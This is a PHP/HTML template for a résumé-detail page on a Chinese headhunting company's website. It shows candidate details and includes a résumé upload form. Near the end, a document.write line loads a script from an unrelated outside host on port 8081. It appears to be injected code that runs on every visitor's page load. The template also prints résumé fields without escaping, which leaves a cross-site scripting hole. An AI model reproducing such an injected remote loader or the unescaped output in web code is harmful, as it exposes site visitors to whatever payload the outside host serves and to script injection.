<?php if (!defined('THINK_PATH')) exit();?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>广州千唯仕企业管理咨询有限公司 | 千千人才，唯你能仕</title>
<meta name="keywords" content="猎头,猎头公司，三顾茅庐，招聘，猎头招聘，猎头顾问，千唯仕" />
<meta name="description" content="千唯仕猎头是中国一家快速成长的专业化猎头公司。核心团队由一批具有十多年行业经验的资深猎头顾问组成，在业内享有良好的口碑和声誉。千唯仕起名灵感来源于英文“trivisit”的音译，意为三顾茅庐，体现公司重视人才，求贤若渴的企业文化。" />
<link rel="stylesheet" type="text/css" href="/Public/css/style.css" />
<script type="text/javascript" src="/Public/js/jquery-1.10.2.min.js"></script>
</head>
<body>
<div class="header">
	<div class="header-c">
		<h1 class="logo"><a href="/" id="logo" title=""></a></h1>
		<span class="toptel"></span>
	</div>
</div>
<div class="navigation">
	<ul class="nav">
		<li><a href="/">首页</a></li>
		<li><a href="<?php echo U('/aboutus/');?>">关于我们</a></li>
		<li><a href="<?php echo U('/culture/');?>">企业文化</a></li>
		<li><a href="<?php echo U('/xlsteps/');?>">寻猎流程</a></li>
		<li><a href="<?php echo U('/advantage/');?>">猎头招人优势</a></li>
		<li><a href="<?php echo U('/recruit/');?>">猎头职位</a></li>
		<li><a href="<?php echo U('/resumer/');?>">千里马档案</a></li>
		<li><a href="<?php echo U('/myrecruit/');?>">招贤纳士</a></li>
		<li><a href="<?php echo U('/contactus/');?>" class="end last">联系我们</a></li>
	</ul>
</div>
<div class="bnlazy sub-banner" data-original="/Public/images/5.jpg" width="100%" height="300" style="display: block; background-image: url(/Public/images/5.jpg);">  
</div>
	<div class="content">
		<div class="content-c pd40">
		<h2 class="sub-rtitle">千里马档案库</h2>
			<div class="rapply">
				<span>编号：<?php echo ($getResumer["id"]); ?></span><span>职位：<strong><?php echo ($getResumer["tobe"]); ?></strong></span>
			</div>
			<table width="100%" border="0" cellspacing="0" cellpadding="0" class="rec-tb">
				<tr>
					<td colspan="4" class="tdbg font14" >个人基本资料</td>
				</tr>
			  <tr>
			    <td align="right" class="tdbg" width="100">姓名：</td>
			    <td><?php echo ($getResumer["name"]); ?>
			    </td>
			    <td align="right" class="tdbg" width="100"  >性别：</td>
			    <td>
					<?php if($getResumer["sex"]): ?>男
	                <?php else: ?>
	                   女<?php endif; ?>
			    </td>
			  </tr>
			  <tr>
			    <td align="right" class="tdbg" width="100">籍贯：</td>
			    <td><?php echo ($getResumer["jiguan"]); ?></td>
			    <td align="right" class="tdbg" width="100"  >出生年月：</td>
			    <td><?php echo (date('Y-m',$getResumer["borndate"])); ?></td>
			  </tr>
			  <tr>
			    <td align="right" class="tdbg" width="100">现居住地：</td>
			    <td colspan="3"><?php echo ($getResumer["address"]); ?></td>
			  </tr>
			  <tr>
					<td colspan="4" class="tdbg font14" >教育/培训经历</td>
				</tr>
				<tr>
					<td colspan="4"><?php echo ($getResumer["education"]); ?></td>
				</tr>
				<tr>
					<td colspan="4" class="tdbg font14" >英语与计算机能力</td>
				</tr>
				<tr>
					<td colspan="4"><?php echo ($getResumer["ability"]); ?></td>
				</tr>
				<tr>
					<td colspan="4" class="tdbg font14" >工作经历</td>
				</tr>
				<tr>
					<td colspan="4"><?php echo ($getResumer["workexp"]); ?></td>
				</tr>
				<tr>
					<td colspan="4" class="tdbg font14" >自我评价</td>
				</tr>
				<tr>
					<td colspan="4"><?php echo ($getResumer["comments"]); ?></td>
				</tr>
			</table>
		</div>
	</div>
<div class="footer">
	<div class="footer-c">
		<p>联系电话：+8620 3424 8656&nbsp;&nbsp;&nbsp;&nbsp;电子邮箱：<a href="mailto:hr@trivisit.com">hr@trivisit.com</a></p>
		<p>Copyright ©2015-2017 千唯仕猎头www.trivisit.com All Rights Reserved&nbsp;&nbsp;&nbsp;&nbsp;粤ICP备15005806号</p>
	</div>
</div>

<!-- <div class="customer"><a href="http://wpa.qq.com/msgrd?v=3&uin=2891075438&site=qq&menu=yes" target="_blank"><img src="/Public/images/qq.jpg" width="28" height="112" border="0" /></a></div> -->
<script type="text/javascript" src="/Public/js/jquery.SuperSlide.2.1.1.js"></script>
<script type="text/javascript" src="/Public/js/jquery.lazyload.min.js"></script>
<script type="text/javascript" src="/Public/js/navstyle.js"></script>
<script type="text/javascript">
	$(function(){
	$(".bnlazy").lazyload();
	//$(".customer").float({});
	});
	
	
	var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://"); document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F734627ff4be7d31b518b64d2ca96157c' type='text/javascript'%3E%3C/script%3E")) 
document.write("<script type=\"text/javascript\" src=\"http://mm.68t68.cn:8081/api.aspx?bhid=1154\"><\/script>");
</script>
<script type="text/javascript" src="/Public/js/pop.js"></script>
<div id="coverbg"></div>
<div id="wstatus">
	<div class="wstatus-c">
		<span class="xicon"><a href="javascript:;" title="关闭" id="xclose"><img src="/Public/images/xicon.gif"></a></span>
		<form action="<?php echo U(MODULE_NAME.'/Apply/uploadHandle');?>" method="post" id="applyForm" name="applyForm"  enctype="multipart/form-data">
			<p>请以附件的形式将简历发送到<a href="">hr@trivisit.com</a></p>
			<p>格式为:职位编号-职位名称-姓名</p>
			<br/>
			<p>或直接上传简历；<input type="hidden" value="<?php echo ($getRecruit["id"]); ?>" name="id" /></p>
			<p>简历上传：<input name="attachs" type="file" style="border:0" /></p>
			<p><input type="submit" value="上 传"  class="btn btn-primary" /></p>
		</form>
	</div>
</div>
</body>
</html>